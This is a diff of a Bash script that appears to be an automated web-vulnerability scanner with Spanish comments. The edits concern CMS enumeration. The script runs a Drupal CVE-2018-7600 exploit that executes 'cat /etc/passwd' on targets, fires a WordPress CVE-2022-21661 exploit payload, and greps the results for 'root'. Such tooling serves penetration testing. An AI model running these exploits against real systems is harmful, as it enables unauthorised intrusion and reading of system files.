@@ -1059,7 +1059,7 @@ function enumeracionCMS () {
 			echo -e "\t\t[+] nuclei Drupal ("$proto_http"://"$host":"$port")"
 			nuclei -u "$proto_http"://"$host":"$port""$path_web"  -id /root/.local/nuclei-templates/cves/drupal_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupalNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupalNuclei.txt &
 
-			drupal7-CVE-2018-7600.py "$proto_http"://"$host":"$port""$path_web" -c 'cat /etc/passwd' > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupal-CVE~2018~7600.txt
+			drupal7-CVE-2018-7600.py "$proto_http"://"$host":"$port""$path_web" -c 'cat /etc/passwd' > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupal-CVE~2018~7600.txt 2>/dev/null
 			# http://www.mipc.com.bo/node/9/devel/token
 			if [[  "$MODE" == "total" ]]; then
 				echo -e "\t\t[+] Revisando vulnerabilidades de drupal ($host)"
@@ -1135,7 +1135,6 @@ function enumeracionCMS () {
 			grep -vi 'Error' logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_wordpressVersion.txt > .enumeracion/"$host"_"$port-$path_web_sin_slash"_wordpressVersion.txt
 			wordpress-CVE-2022-21661.py --url "$wordpress_url"wp-admin/admin-ajax.php --payload 1 > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wordpress-CVE~2022~21661.txt 2>/dev/null &
 
-			# https://github.com/roddux/wordpress-dos-poc/tree/master WordPress <= 5.3
 
 			# si tiene el valor "internet" (se esta escaneando redes de internet) si no tiene valor se escanea un dominio
 			if [[ "$FORCE" != "internet" ]]; then #ejecutar solo cuando se escanea por dominio y no masivamente por IP
@@ -2165,7 +2164,7 @@ if [[ $webScaneado -eq 1 ]]; then
 			
 
 			[ ! -e ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_drupal-CVE~2018~7600.txt" ] && grep -i root logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupal-CVE~2018~7600.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupal-CVE~2018~7600.txt 2>/dev/null
-			[ ! -e ".enumeracion2/"$host"_"$port-$path_web_sin_slash"_company.txt" ] && cat logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_cert.txt 2>/dev/null | jq '.commonName' 2>/dev/null | domain2company.py | egrep -v 'Error en la entrada|linksys|wifi|akamai|asus|dynamic-m|whatsapp|test|ruckuswireless|realtek|fbcdn|googlevideo|nflxvideo|winandoffice' > .enumeracion/"$host"_"$port-$path_web_sin_slash"_company.txt 2>/dev/null
+			[ ! -e ".enumeracion2/"$host"_"$port-$path_web_sin_slash"_company.txt" ] && cat logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_cert.txt 2>/dev/null | domain2company.py | egrep -iv 'Error en la entrada|linksys|wifi|akamai|asus|dynamic-m|whatsapp|test|ruckuswireless|realtek|fbcdn|googlevideo|nflxvideo|winandoffice|:|self-signed|Certificate|localhost|fortigate|Error' > .enumeracion/"$host"_"$port-$path_web_sin_slash"_company.txt 2>/dev/null
 			
 			[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_wpUsers.txt" ] && cat logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpUsers.json 2>/dev/null | wpscan-parser.py 2>/dev/null | awk {'print $2'} > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpUsers.txt 2>/dev/null
 			[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_CS-39.txt" ] && cp logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-39.txt 2>/dev/null
